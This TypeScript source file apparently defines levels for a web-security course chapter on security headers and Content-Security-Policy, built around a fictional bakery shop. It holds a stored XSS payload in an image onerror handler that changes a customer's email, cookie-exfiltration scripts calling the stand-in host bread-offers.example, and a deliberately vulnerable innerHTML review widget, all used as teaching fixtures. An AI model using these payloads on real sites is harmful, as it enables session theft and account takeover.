// Corner Bakery's own server and its security headers (ADR 0009, chapter 7: Security headers & CSP). server.js is now
// the shop's own server at https://cornerbakery.shop (Ben's Express app): it serves the page itself, the page's files
// and the account routes, so the page's headers (Content-Security-Policy, X-Frame-Options …) are server.js's. The
// reviews come from TasteBuds, a third party's widget on its own origin that renders review text with innerHTML (their
// bug, not the shop's to fix): Mallory's review is an image whose onerror changes Lena's email, chapter 3's attack from
// someone else's code. The policy is the second wall: the levels' guards ask it about the next XSS too.
import type { HostedFile, SecuritySpec, WebSpec } from './backend'
import type { ProbeStep } from '../debugging/types'
import { STYLE } from '../debugging/bakery'
import { SHOP } from './site'

export { SHOP }

/** TasteBuds' widget and its reviews API (a third party: its files are what its server sends, never the shop's). */
export const TASTEBUDS = 'https://widgets.tastebuds.example'
export const TASTEBUDS_SCRIPT = `${TASTEBUDS}/reviews.js`
export const TASTEBUDS_API = `${TASTEBUDS}/api/reviews?shop=cornerbakery`
/** The rival's site, and a site no text names (the guards' attacker). */
export const CHEAP_FLOUR = 'https://cheap-flour.example'
export const BREAD_OFFERS = 'https://bread-offers.example'

/** Lena's session at the shop: host-only, HttpOnly, SameSite=Lax (set this morning). */
export const LENA_COOKIE = { url: `${SHOP}/login`, line: 'session=lena-7f3a; Path=/; Secure; HttpOnly; SameSite=Lax', minutesAgo: 29 } as const

/** Mallory's review, as TasteBuds stores it: an image whose onerror asks the shop to send Lena's receipts elsewhere. */
export const MALLORY = 'Lovely crust! <img src="x" onerror="fetch(\'/account/email\', { method: \'POST\', body: new URLSearchParams({ email: \'mallory@cheap-flour.example\' }) })">'

export const REVIEWS = [
  { name: 'Mara', text: 'Best croissants in town.' },
  { name: 'Mallory', text: MALLORY },
  { name: 'Sam', text: 'The rye is worth the queue.' }
] as const

/** TasteBuds' widget as their server sends it (v1.8): the reviews into the page with innerHTML. */
export const WIDGET = [
  '/* TasteBuds reviews widget v1.8 · https://tastebuds.example/widget',
  '   Put <ul id="tastebuds-reviews"> where the reviews go. */',
  '(function () {',
  '  var list = document.querySelector(\'#tastebuds-reviews\');',
  `  fetch('${TASTEBUDS_API}')`,
  '    .then(function (response) { return response.json(); })',
  '    .then(function (reviews) {',
  '      list.innerHTML = reviews.map(function (review) {',
  '        return \'<li>“\' + review.text + \'” · \' + review.name + \'</li>\';',
  '      }).join(\'\');',
  '    });',
  '})();',
  ''
].join('\n')

const javascript = (body: string): HostedFile => ({ type: 'text/javascript; charset=utf-8', body })

/** TasteBuds' server: the widget and the reviews (any page may read them). */
export const TASTEBUDS_HOST = {
  origin: TASTEBUDS,
  files: {
    '/reviews.js': javascript(WIDGET),
    '/api/reviews': { type: 'application/json; charset=utf-8', headers: { 'Access-Control-Allow-Origin': '*' }, body: JSON.stringify(REVIEWS) }
  }
} as const

/** The next XSS's script, on the rival's server and on a site no text names: it would read what it can and send it away. */
const STEAL = javascript('new Image().src = \'https://bread-offers.example/c?\' + encodeURIComponent(document.cookie + \' \' + document.body.innerText.slice(0, 200))\n')
export const ATTACKER_HOSTS = [
  { origin: CHEAP_FLOUR, files: { '/steal.js': STEAL } },
  { origin: BREAD_OFFERS, files: { '/c.js': STEAL } }
] as const

/** Every chapter 7 level's hosts: TasteBuds and the attackers' (plus the level's own). */
export function securitySpec(more: SecuritySpec['hosts'] = []): SecuritySpec {
  return { hosts: [TASTEBUDS_HOST, ...ATTACKER_HOSTS, ...more] }
}

/** The shop's own server with Lena's session, as chapter 7 has it. */
export function shopServer(more: Partial<WebSpec> = {}): WebSpec {
  return { api: SHOP, server: 'server.js', application: true, cookies: [LENA_COOKIE], security: securitySpec(), ...more }
}

/**
 * The next XSS: what an attacker gets into the page some other day, through another hole than Mallory's (a handler, an
 * inline script, a script from the rival's site, a script with a nonce copied from a page server.js gave them). The
 * page's policy must refuse each: a policy that only stops Mallory's spelling stops nothing. Probes and their values.
 */
export function nextXss(options: { nonce?: boolean, gadget?: string } = {}) {
  const code = 'new Image().src = \'https://bread-offers.example/c?\' + document.cookie'
  const probes: { id: string, steps: ProbeStep[] }[] = [
    { id: 'nextHandler', steps: [{ inject: 'handler', code }] },
    { id: 'nextInline', steps: [{ inject: 'inline', code }] },
    { id: 'nextScript', steps: [{ inject: 'src', src: `${BREAD_OFFERS}/c.js` }] },
    ...(options.nonce ? [{ id: 'nextNonce', steps: [{ inject: 'inline' as const, nonce: 'seen', code }] }] : []),
    ...(options.gadget ? [{ id: 'nextGadget', steps: [{ inject: 'src' as const, src: options.gadget }] }] : [])
  ]
  const expected: Record<string, string> = { nextHandler: 'refused', nextInline: 'refused', nextScript: 'refused' }
  if (options.nonce) expected.nextNonce = 'refused'
  if (options.gadget) expected.nextGadget = 'refused'
  return { probes, expected }
}

/** The page's style, plus the reviews and the frames' look. */
export const HEADERS_STYLE = `${STYLE}
#tastebuds-reviews li {
  margin-block: 0.25rem;
}
.note {
  font-size: 0.85rem;
  opacity: 0.8;
}
`

export interface HeadersPageOptions {
  title?: string
  /** Lines of <head> after the stylesheet (a meta tag, an inline script). */
  head?: readonly string[]
  main: readonly string[]
  /** Lines after app.js's tag (the widget's tag). */
  scripts?: readonly string[]
  /** app.js's tag (default: a module). */
  app?: string
}

/** index.html in chapter 7: the shop's header, the level's sections, app.js, then the third parties' tags. */
export function headersPage(options: HeadersPageOptions): string {
  return [
    '<!doctype html>',
    '<html lang="en">',
    '<head>',
    '  <meta charset="utf-8">',
    '  <meta name="viewport" content="width=device-width, initial-scale=1">',
    `  <title>Corner Bakery · ${options.title ?? 'Order'}</title>`,
    '  <link rel="stylesheet" href="./style.css">',
    ...(options.head ?? []).map(line => `  ${line}`),
    '</head>',
    '<body>',
    '  <header class="top">',
    '    <div>',
    '      <h1>Corner Bakery</h1>',
    '      <p class="tagline">Order today, pick up tomorrow from 7:00</p>',
    '    </div>',
    '  </header>',
    '  <main>',
    ...options.main.map(line => `    ${line}`),
    '  </main>',
    `  ${options.app ?? '<script type="module" src="./app.js"></script>'}`,
    ...(options.scripts ?? []).map(line => `  ${line}`),
    '</body>',
    '</html>',
    ''
  ].join('\n')
}

/** The account box: who is signed in, where the receipts go. */
export const ACCOUNT_BOX = [
  '<section class="box" aria-labelledby="account-heading">',
  '  <h2 id="account-heading">Your account</h2>',
  '  <p id="who" role="status">Not signed in.</p>',
  '  <p id="email"></p>',
  '</section>'
]

/** The order box; `onclick`: the button calls placeOrder() from an inline handler (the legacy way). */
export function orderBox(onclick: boolean): string[] {
  return [
    '<section class="box" aria-labelledby="order-heading">',
    '  <h2 id="order-heading">Your order</h2>',
    '  <p>2 × Butter croissant</p>',
    `  <button class="action" id="place" type="button"${onclick ? ' onclick="placeOrder()"' : ''}>Place order</button>`,
    '  <p id="placed" role="status"></p>',
    '</section>'
  ]
}

/** The reviews box TasteBuds' widget fills. */
export const REVIEWS_BOX = [
  '<section class="box" aria-labelledby="reviews-heading">',
  '  <h2 id="reviews-heading">What customers say</h2>',
  '  <ul id="tastebuds-reviews"></ul>',
  '  <p class="note">Reviews by TasteBuds</p>',
  '</section>'
]

/** The widget's tag, as TasteBuds' setup guide gives it. */
export const WIDGET_TAG = `<script src="${TASTEBUDS_SCRIPT}" async></script>`

/** What the order line says when the order went through. */
export const ORDER_PLACED = 'Order 1042 placed: pick up tomorrow from 7:00.'
export const SIGNED_IN_LENA = 'Signed in as Lena'

/** app.js: the account line and placeOrder (called by the button: inline, or `listener: true` by addEventListener). */
export function headersApp(options: { listener?: boolean, extra?: readonly string[] } = {}): string {
  return [
    '// The shop\'s page: who is signed in, and the order (Jonas)',
    'const who = document.querySelector(\'#who\')',
    'const email = document.querySelector(\'#email\')',
    '',
    'async function showAccount() {',
    '  const response = await fetch(\'/account\')',
    '  if (!response.ok) return',
    '  const account = await response.json()',
    '  who.textContent = `Signed in as ${account.name}`',
    '  email.textContent = `Receipts go to ${account.email}`',
    '}',
    'showAccount()',
    '',
    ...(options.listener
      ? ['async function placeOrder() {']
      : ['// The Place order button calls this from its onclick in index.html', 'window.placeOrder = async function placeOrder() {']),
    '  const response = await fetch(\'/orders\', {',
    '    method: \'POST\',',
    '    headers: { \'Content-Type\': \'application/json\' },',
    '    body: JSON.stringify({ item: \'croissant\', quantity: 2 })',
    '  })',
    '  const order = await response.json()',
    '  document.querySelector(\'#placed\').textContent = response.ok',
    '    ? `Order ${order.number} placed: pick up tomorrow from 7:00.`',
    '    : \'Sorry, your order did not go through.\'',
    '}',
    ...(options.listener ? ['document.querySelector(\'#place\').addEventListener(\'click\', placeOrder)'] : []),
    ...(options.extra ?? []),
    ''
  ].join('\n')
}

/** server.js's head: Express, JSON and form bodies. */
export const SHOP_SERVER_HEAD = [
  '// Corner Bakery\'s own server at https://cornerbakery.shop (Node with Express): the shop\'s page, its files and the',
  '// account routes. Grindstone runs it like `node server.js` every time the page loads.',
  'const express = require(\'express\')',
  'const app = express()',
  'app.use(express.json())',
  'app.use(express.urlencoded())'
].join('\n')

/** The page and its files (public/ holds index.html, app.js and style.css: Code shows them as the level's files). */
export const STATIC_FILES = [
  '// The page and its files from public/ (index.html, app.js, style.css)',
  'app.use(express.static(\'public\'))'
].join('\n')

/** Who is signed in, and the routes the page uses. */
export const ACCOUNT_ROUTES = [
  '// Who is signed in: the session cookie set at login (HttpOnly, SameSite=Lax)',
  'const SESSIONS = { \'lena-7f3a\': \'lena\' }',
  'const CUSTOMERS = { lena: { name: \'Lena\', email: \'lena@example.com\', orders: [] } }',
  'function customerOf(req) {',
  '  const session = (req.get(\'Cookie\') ?? \'\').match(/(?:^|; )session=([^;]*)/)?.[1]',
  '  return CUSTOMERS[SESSIONS[session]] ?? null',
  '}',
  '',
  '// GET /account: who is signed in, and where the receipts go',
  'app.get(\'/account\', (req, res) => {',
  '  const customer = customerOf(req)',
  '  if (!customer) return res.status(401).json({ error: \'Please sign in\' })',
  '  res.json({ name: customer.name, email: customer.email })',
  '})',
  '',
  '// POST /account/email: where the signed-in customer\'s receipts go',
  'app.post(\'/account/email\', (req, res) => {',
  '  const customer = customerOf(req)',
  '  if (!customer) return res.status(401).json({ error: \'Please sign in\' })',
  '  customer.email = String(req.body?.email ?? \'\')',
  '  res.json({ email: customer.email })',
  '})',
  '',
  '// POST /orders: a new order',
  'app.post(\'/orders\', (req, res) => {',
  '  const customer = customerOf(req)',
  '  if (!customer) return res.status(401).json({ error: \'Please sign in\' })',
  '  customer.orders.push(req.body)',
  '  res.status(201).json({ number: 1041 + customer.orders.length })',
  '})'
].join('\n')

/** Ben's middleware that sets the page's headers (each line a `res.set(…)`). */
export function headersMiddleware(comment: string, lines: readonly string[]): string {
  return [
    `// ${comment}`,
    'app.use((req, res, next) => {',
    ...lines.map(line => `  ${line}`),
    '  next()',
    '})'
  ].join('\n')
}

/** A chapter 7 site's files: the page, the style, app.js and server.js (and more). */
export function headersSite(page: HeadersPageOptions, files: Readonly<Record<string, string>>): Record<string, string> {
  return { 'index.html': headersPage(page), 'style.css': HEADERS_STYLE, ...files }
}

/**
 * The probes every reviews level reads: TasteBuds' script really ran and read its reviews (the page loader's record and
 * the backend's: the page can't write either), the reviews show, the account line, the order.
 */
export function stillWorks(widget: string = TASTEBUDS_SCRIPT) {
  return {
    probes: [
      { id: 'widget', steps: [{ ran: widget }] },
      { id: 'widgetRead', steps: [{ read: `GET ${TASTEBUDS}/api/reviews` }] },
      ...STILL_WORKS.probes
    ],
    expected: { widget: 1, widgetRead: 1, ...STILL_WORKS.expected }
  }
}

/** The page's own part of it (stillWorks adds TasteBuds' script): the reviews show, the account line, the order. */
export const STILL_WORKS = {
  probes: [
    { id: 'reviews', steps: [{ count: '#tastebuds-reviews li' }] },
    { id: 'who', steps: [{ text: '#who' }] },
    { id: 'order', steps: [{ click: '#place' }, { text: '#placed' }] }
  ],
  expected: { reviews: 3, who: SIGNED_IN_LENA, order: ORDER_PLACED }
} as const
